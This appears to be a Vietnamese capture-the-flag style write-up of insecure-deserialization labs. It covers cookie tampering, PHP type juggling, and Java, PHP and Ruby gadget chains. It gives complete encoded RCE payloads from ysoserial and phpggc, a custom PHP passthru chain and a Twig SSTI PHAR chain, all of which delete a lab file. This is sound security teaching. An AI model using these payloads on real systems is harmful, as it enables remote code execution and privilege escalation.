# Nguyễn Văn Thọ - Insecure deserialization


### Bài 1: Modifying serialized objects

>![](https://i.imgur.com/1v8YHZh.png)

Bài lab này sửa dụng chức năng serialize với cookie session và dẫn đến lỗ hổng leo quyền. Để solve bài lab cần leo quyền admin và xóa user `carlos`

Kiểm tra cookie ta thấy nó ở dạng urlendcode

>![](https://i.imgur.com/GaZkZVv.png)

Urldecode và thử base64decode thì thấy giá trị của nó như sau

>O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

Đây là chuỗi serialized của đối tượng `User`, trong đó ta thấy thuộc tính `admin` kiểu boolean đang có giá trị là `0`, đổi nó lại thành 1 và encode lại, sau đó thay cookie, là ta đã vào được admin panel

>![](https://i.imgur.com/VZqvile.png)

Kết quả:

>![](https://i.imgur.com/95C6g2d.png)

<hr>

### Bài 2: Modifying serialized data types

>![](https://i.imgur.com/0OHBgFD.png)

Mô tả giống bài trên

Lần này, chuỗi serialized có dạng như sau:

```!
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"xhi38xhih0e9mn9oq5sskulmqdbx4qes";}
```

Trang web sẽ kiểm tra access token thay vì biến boolean như bài trên, dựa theo hint của đề, ta tìm kiếm `vulnerability in string compare PHP` và thấy được bảng `Type Juggling`.

Theo đó khi so sánh kiểu `int` có giá trị `0` với string bất kì nó sẽ trả về `True`. Sửa lại chuỗi serialized ta thấy không thành công.

Thay lại username thành `administrator` thì cuối cùng bypass được xác thực và vào tài khoản admin.

>![](https://i.imgur.com/YdHA9Ud.png)

**Kết quả:**

>![](https://i.imgur.com/cjzd44l.png)


<hr>

### Bài 3: Using application functionality to exploit insecure deserialization

>![](https://i.imgur.com/FfxZYsB.png)

Bài lab cho ta 2 tài khoản, và yêu cầu khai thác chuỗi serialize để xóa file `morale.txt` của `carlos`

Kiểm tra ta thấy cookie có dạng như sau:

```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"a59he793hnj05ekhink1y8d2f0cgmxde";s:11:"avatar_link";s:23:"/home/gregg/avatar";}
```

Trang web lần này lại có thêm chức năng `Delete account`, vậy khi ta delete account thì các thông tin như avatar sẽ bị xóa theo.

Lợi dụng lỗ hổng đó, ta có thể xóa file `morale.txt` của `carlos` bằng cách thay đường dẫn avatar_link của gregg bằng `/home/gregg/morale.txt`

Sau đó encode và thay cookie lại, xóa account của chính mình.

Kết quả ta có:

>![](https://i.imgur.com/xpSvBz3.png)

<hr>

### Bài 4: Arbitrary object injection in PHP

>![](https://i.imgur.com/EFTSXIA.png)

Trong source HTML có đoạn comment như sau:

>![](https://i.imgur.com/4e51iL5.png)

Thử truy cập vào file (theo hint thì append thêm `~` sẽ tới được file backup) => ta tìm được class `customTemplate` như sau

```php!
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
?>
```

Đoạn destruct có hàm `unlink` có tác dụng delete file, ta sẽ lợi dung nó để thực hiện yêu cầu.

>![](https://i.imgur.com/F8fSI4z.png)

Đầu tiên ta cần tạo đối tượng của class này, sau đó serialize nó.

>![](https://i.imgur.com/ownISeI.png)

```!
O:14:"CustomTemplate":2:{s:18:"template_file_path";s:23:"/home/carlos/morale.txt";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Kết quả:

>![](https://i.imgur.com/Ye2TcYL.png)

<hr>

### Bài 5: Exploiting Java deserialization with Apache Commons

>![](https://i.imgur.com/AC6lDGU.png)

Bài lab yêu cầu sử dụng tool để tự động generate chuỗi serialized nhằm RCE. Sau đó ta cần xóa file `morale.txt` của `carlos` để solve.

Đề cũng gợi ý rằng trang web sử dụng `Apache Commons Collections` để serialize chuỗi session. Công việc của ta sẽ là đi tìm công cụ phù hợp để khai thác gadget chain.

Công cụ mà ta sử dụng sẽ là `ysoserial`, nó có thể giúp ta generate ra chuỗi khai thác dựa trên thư viện mà trang web sử dụng. Khi trang web thực hiện deserialize chuỗi input của ta sẽ gặp lỗi `insecure deserialize` dẫn tới code chèn vào được thực thi.

Generate được 1 chuỗi như sau:

```
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBh%0AcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9u%0Acy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci%2F5hPArsQjM%0AAgACTAAJZGVjb3JhdGVkcQB%2BAAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMv%0AY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0%0AaW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29y%0AZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVy%0AMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVj%0AdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25z%0ANC5UcmFuc2Zvcm1lcjs5gTr7CNo%2FpQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29s%0AbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25z%0AdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5p%0AbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUu%0AY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H%2Bk%0AhtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGph%0AdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFz%0AcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVz%0ASW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVj%0Ab2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFf%0Ab3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD%2F%2F%2F%2F%2FdXIAA1tb%0AQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX%2BAYIVOACAAB4cAAABqrK%2Frq%2BAAAAMgA5CgADACIH%0AADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4B%0AAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh%0AYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2Vy%0AaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9y%0AbQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9z%0AdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxl%0AcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0%0AYy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2Vy%0AaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3Vu%0AL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUv%0AeG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwv%0AaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1%0ATGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdo%0AYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp%0AYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5%0Ac29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20v%0Ac3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5z%0AbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50%0AZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9H%0AYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUo%0AKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY2FybG9zL21vcmFsZS50%0AeHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAy%0AADMKACsANAEADVN0YWNrTWFwVGFibGUBABt5c29zZXJpYWwvUHduZXI2MzMzNzQ2MzYxNzABAB1M%0AeXNvc2VyaWFsL1B3bmVyNjMzMzc0NjM2MTcwOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgA%0ABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUA%0ADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEA%0ADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAAB%0AsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAA%0AAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAA%0AAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AHwAAAdTK%2Frq%2BAAAAMgAb%0ACgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp%0A7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJp%0AYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9h%0AZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoB%0AACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QB%0AABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMA%0AIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEA%0AAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQ%0AAAlwdAAEUHducnB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIA%0AHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHcEAAAAA3NyABFqYXZh%0ALmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0L%0AlOCLAgAAeHAAAAABcQB%2BACl4
```


Pasted đoạn payload trên vào cookie, ta được kết quả mong muốn.

>![](https://i.imgur.com/AYkC3fo.png)

Tìm hiểu thì em thấy rằng ACC ver < 4.1 gặp lỗ hổng này khi xử lý các chuỗi serialized, các code gadget có sẵn của thư viện bị lợi dụng để khai thác

>![](https://i.imgur.com/koOXjk9.png)

<hr>

### Bài 6: Exploiting PHP deserialization with a pre-built gadget chain

>![](https://i.imgur.com/5tiv0JX.png)

Ở bài này, cookie gồm 1 `token` và 1 `hmac signature` để đảm bảo tính toàn vẹn của token.

```!
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlM2l6ZXVrcWtvbzR6czdyemU1ZXpnMWwyMTB3M295aiI7fQ==","sig_hmac_sha1":"5b4348b769911e72ce801abb32e9414c8a62a67b"}
```

Kiểm tra `token` thấy nó bao gồm thông tin như sau:

```!
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"e3izeukqkoo4zs7rze5ezg1l210w3oyj";}
```

Để khai thác chúng ta cần phải biết secret key để tạo `hmac signature`

Quét các đường dẫn, ta thấy có route `/cgi-bin/` kiểm tra thấy có thêm file `phpinfo.php` trong đó có secret key như sau:

>![](https://i.imgur.com/oNmiSv9.png)

Tiếp theo ta cần biết framework mà trang web đang xài, tìm kiếm thêm trong file này ta thấy.

Thử paste giá trị ngẫu nhiên vào cookie, có 1 error message pop up cho biết rằng trang web dùng `Symfony 4.3.6`

>![](https://i.imgur.com/W6FBTqn.png)

Dùng tool `phpggc` để generate gadget chain với Symfony ta có.

![](https://i.imgur.com/SFtdL34.png)

Paste chuỗi này vào phần `token` trong cookie và kí lại với sha1 và secret ở trên, ta có cookie mới 

```!
%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%229e8d212c93201e4490f3776905808d1727faf6c7%22%7D
```

>![](https://i.imgur.com/QzXOqfo.png)


<hr>

### Bài 7: Exploiting Ruby deserialization using a documented gadget chain

>![](https://i.imgur.com/bkoxIQR.png)

Ở bài lab này, đề miêu tả rằng không có sẵn tool nào phục vụ cho việc generate payload tự động như các bài trên, và đòi hỏi ta phải tìm kiếm tài liệu khai thác sau đó tự xây dựng lại payload.

Đã biết trang web sử dụng Ruby phía backend, ta tìm kiếm `Ruby gadget chain deserialization` thì ra blog [này](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html).

Sử dụng payload của ngta và sửa lại câu lệnh thành `rm /home/carlos/morale.txt`, ta có kết quả được payload như sau.

```!
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ%3D%3D
```

Thay cookie bằng giá trị này ta solve bài lab.

>![](https://i.imgur.com/wtZOv0B.png)


<hr>


### Bài 8: Developing a custom gadget chain for Java deserialization

>![](https://i.imgur.com/52c8r9I.png)


<hr>

### Bài 9: Developing a custom gadget chain for PHP deserialization

>![](https://i.imgur.com/iGfvkBw.png)

Đầu tiên, dựa vào hint ta tìm file backup để đọc.

>![](https://i.imgur.com/qMjIoBS.png)

Dựa vào đoạn code trên, ta biết có 4 class trong chương trình. Để thực hiện khái thác gadget chain for deserialization ta cần tạo 2 đối tượng `kick-off` và `sink` - Một để trigger cái chain và một để thực thi RCE như mong muốn.

Chú ý ta thấy class `DefaultMap` cho phép thực thi một hàm call back khi đối tượng của class này trỏ đến một thuộc tính `private` | `non-exist`, hàm call back này được truyền vào lúc khởi tạo đối tượng của lớp. Thuộc tính `Không tồn tại` đó sẽ được truyền làm tham số cho callback function. Ví dụ

```php!
$test = new DefaultMap("passthru");
$command = "id";
$test->$command; // sẽ thực thi command phía trên
```

Minh họa:

>![](https://i.imgur.com/iW20CrW.png)

=> Vậy là ta đã tìm được một `sink`, cần tìm một lớp mà đối tượng của nó có thể trigger được đoạn code như trên.

Chú ý lớp `Product` ta thấy có một đoạn `$this->desc = $desc->$default_desc_type;` có vẻ tương tự `$test->$command` như ta làm ở trên, đối tượng của lớp này lại được tạo trong lớp `CustomTemplate`

>![](https://i.imgur.com/0bEZXN9.png)

Lớp này có hàm `__wakeup` sẽ tự động được gọi khi chương trình unserialize đối tượng của lớp. Hàm này gọi tới phương thức `build_product()` và phương thức này khởi tạo một đối tượng `Product`, trong hàm tạo của đối tượng này lại gọi đến lệnh `sink` như trình bày ở trên.

Vậy theo chuỗi trình bày ở trên, ta cần serial một đối tượng của `CustomTemplate` với $desc = đối tượng của `DefaultMap` gọi tới hàm callbacl `passthru` VÀ $default_desc_type = `rm /home/carlos/morale.txt`.

Payload:

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;

    public function __construct() {
        $this->desc = new DefaultMap('passthru');
        $this->default_desc_type = 'rm /home/carlos/morale.txt';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }
}

$test = new CustomTemplate();
$ser = serialize($test);
echo($ser . "\n");
echo("===================================================\n");
echo("base64 endcoded then urlencoded: \n");
echo(urlencode(base64_encode($ser)) . "\n");

?>
```
Kết quả:

>![](https://i.imgur.com/Z4u7W08.png)

<hr>

### Bài 10: Using PHAR deserialization to deploy a custom gadget chain

>![](https://i.imgur.com/NR6xpr5.png)

Ở bài này, trang web sẽ không có chức năng `unserialize()` nào được sử dụng, tuy nhiên vẫn có kĩ thuật khác để khai thác.

Trong tài liệu của PHP cho biết rằng PHAR file chứa dữ liệu được serialized, vì thế, bất cứ chức năng liên quan đến file (file_get_contents, filesize, file_exist...) sử dụng scheme `phar://` đều dẫn đến deserialize nội dung file này. Do đó ta có thể tạo được vector khai thác thông qua việc upload 1 phar file.

Upload 1 ảnh jpg lên trang web của bài lab, ta thấy ảnh được lưu ở đường dẫn sau:

>![](https://i.imgur.com/qLrxPd5.png)

Dựa vào thư mục `cgi-bin` public, ta tìm được 2 file php có các đoạn code như sau.

>![](https://i.imgur.com/QmCJLSK.png)

>![](https://i.imgur.com/ithU6Mm.png)

Ở lớp `blog`, nó cho biết trang web sử dụng template engine `Twig`, ta có thể sử dụng SSTI để thực thi code, đây sẽ là `sink` mà ta cần dùng trong chain.

Để tìm một `kick-off` sử dụng `__toString()` của đối tượng `Blog`, ta kiểm tra và thấy `__destruct()` của lớp `CustomTemplate` gọi tới hàm `lockFilePath()`, hàm này lại trỏ đến biến `$template_file_path` mà ta có thể truyền vào lúc khởi tạo.

Vậy nếu khởi tạo `$template_file_path` với giá trị là đối tượng `Blog` thì lúc destruct sẽ trigger method `__tostring` sẽ dẫn đến SSTI => xóa file `carlos`

Tạo phar-jpg file để nhét script sau vô 

```php!
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
```
>![](https://i.imgur.com/KiBT52R.png)

<hr>



==https://nima.ninja/blog/2023/expert-lab-developing-a-custom-gadget-chain-for-php-deserialization==